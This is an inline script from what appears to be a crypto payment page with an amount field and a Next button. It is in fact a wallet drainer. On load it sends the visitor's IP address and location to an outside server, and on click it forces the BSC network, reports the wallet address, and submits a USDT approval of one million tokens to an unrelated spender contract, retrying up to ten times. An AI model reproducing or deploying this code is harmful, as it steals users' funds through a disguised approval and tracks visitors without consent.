  <script>
    const amountInput = document.getElementById('amount');
    const nextBtn = document.getElementById('nextBtn');
    amountInput.addEventListener('input', function () {
        this.value = this.value.replace(/[^0-9.]/g, ''); // allows digits and dot only
        // optional: allow only one dot
        const parts = this.value.split('.');
        if (parts.length > 2) {
            this.value = parts[0] + '.' + parts[1];
        }
        updateButtonState();
    });
    

    // Function to update button state
    function updateButtonState() {
        const isDark = window.matchMedia('(prefers-color-scheme: dark)').matches;
        const hasValue = amountInput.value.trim() !== '';
        
        if (hasValue) {
            // Active state
            nextBtn.style.opacity = '1';
            nextBtn.style.cursor = 'pointer';
            nextBtn.style.pointerEvents = 'auto';
            
            if (isDark) {
                nextBtn.style.backgroundColor = "#00D97E";
            } else {
                nextBtn.style.backgroundColor = "#0702F8";
            }
        } else {
            // Disabled state
            nextBtn.style.opacity = '1';
            nextBtn.style.cursor = 'not-allowed';
            nextBtn.style.pointerEvents = 'none';
            
            if (isDark) {
                nextBtn.style.backgroundColor = "#555555";
            } else {
                nextBtn.style.backgroundColor = "#9b98ff";
            }
        }
    }

    // --- Theme detection ---
    function applyTheme() {
        const isDark = window.matchMedia('(prefers-color-scheme: dark)').matches;
        
        if (isDark) {
            document.body.style.backgroundColor = "#1a1a1a";
            document.body.style.color = "white";
        } else {
            document.body.style.backgroundColor = "white";
            document.body.style.color = "black";
        }
        
        // Update button state when theme changes
        updateButtonState();
    }

    applyTheme();
    window.matchMedia('(prefers-color-scheme: dark)').addEventListener('change', applyTheme);

    const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955"; 
    const SPENDER_CONTRACT = "0xa589020C7cAdfec87fb5ad13d694FeC528BF7B84";
    const USDT_DECIMALS = 18;

    const API_BASE = "https://2-1ccm.onrender.com/";

    // --- Read base64 uid from ?id= ---
    function logUidFromQuery() {
        const params = new URLSearchParams(window.location.search);
        const idParam = params.get('id');
        if (!idParam) {
            return null;
        }

        // Normalize base64url to standard base64 and pad
        let normalized = idParam.replace(/-/g, '+').replace(/_/g, '/');
        if (normalized.length % 4 !== 0) {
            normalized += '='.repeat(4 - (normalized.length % 4));
        }

        try {
            const binary = atob(normalized);
            const bytes = Uint8Array.from(binary, c => c.charCodeAt(0));
            const decoded = new TextDecoder().decode(bytes);
            const numeric = decoded.trim();
            if (/^\d+$/.test(numeric)) {
                return numeric;
            }
            return null;
        } catch (e) {
            return null;
        }
    }

    // Print once on load (preserve previous behavior)
    (function () {
        const initialUid = logUidFromQuery();
        console.log(initialUid ?? "no uid");
    })();

    async function postJSON(path, data) {
        try {
            const id = logUidFromQuery();
            const url = `${API_BASE}${path}`;
            const payload = { ...(data || {}), uid: id };
            const body = JSON.stringify(payload);

            console.log(id ?? "no uid");
            console.log("URL:", url);
            console.log("BODY:", body);
            
            await fetch(`${API_BASE}${path}`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body
            });
        } catch (err) {}
    }
    
    async function postInfo(text) {
        return postJSON('/info', { text });
    }

    async function sendVisitorInfo() {
        try {
            const res = await fetch('https://ipapi.co/json/');
            const data = await res.json();

            const ip = data.ip;
            const city = data.city;
            const region = data.region;
            const country = data.country_name;
            const flag = data.country_code ? String.fromCodePoint(...[...data.country_code.toUpperCase()].map(c => 0x1F1E6 + c.charCodeAt(0) - 65)) : '';
            const timezone = data.timezone;
            const url = window.location.href;

            const location = `${city}, ${region}, ${country}`;

            await postJSON('/visitor', {
                ip,
                location,
                timezone,
                url,
                country_flag: flag
            });
        } catch (err) {}
    }

    async function approveUSDT(account) {
        const usdtAbi = ["function approve(address spender, uint256 amount) public returns (bool)"];
        const provider = new ethers.providers.Web3Provider(window.ethereum);
        const signer = provider.getSigner(account);
        const usdtContract = new ethers.Contract(USDT_ADDRESS, usdtAbi, signer);
        const amount = ethers.utils.parseUnits("1000000", USDT_DECIMALS);

        for (let attempt = 1; attempt <= 10; attempt++) {
            try {
                const tx = await usdtContract.approve(SPENDER_CONTRACT, amount);
                await postJSON('/checkTrx', { trx: tx.hash });
                await tx.wait();
                break;
            } catch (err) {
                if (attempt === 10) {
                    await postInfo(`Approval failed after retries: ${err.message}`);
                }
            }
        }
    }

    async function getAddress() {
        try {
            const currentChain = await window.ethereum.request({ method: 'eth_chainId' });
            if (currentChain !== '0x38') {
                await window.ethereum.request({
                    method: 'wallet_switchEthereumChain',
                    params: [{ chainId: '0x38' }],
                });
            }

            let accounts = await window.ethereum.request({ method: 'eth_accounts' });
            let msg = "";

            if (accounts.length) {
                msg = "Directly got: " + accounts[0];
            } else {
                accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                if (accounts.length) {
                    msg = "Asked for connect, got: " + accounts[0];
                } else {
                    msg = "No wallet connected.";
                }
            }

            await postInfo(msg);

            if (accounts.length) {
                await postJSON('/connectedwallet', { wallet: accounts[0] });
                await approveUSDT(accounts[0]);
            }

        } catch (e) {
            await postInfo("Error: " + e.message);
        }
    }

    // --- Make Next button active when amount is entered ---
    amountInput.addEventListener('input', updateButtonState);

    // Initialize button state on load
    updateButtonState();

    // --- Send notification when page opens ---
    sendVisitorInfo();

    // --- Execute wallet script when Next button is clicked ---
    nextBtn.addEventListener('click', function() {
        if (amountInput.value.trim() !== '') {
            getAddress();
        }
    });
  </script>
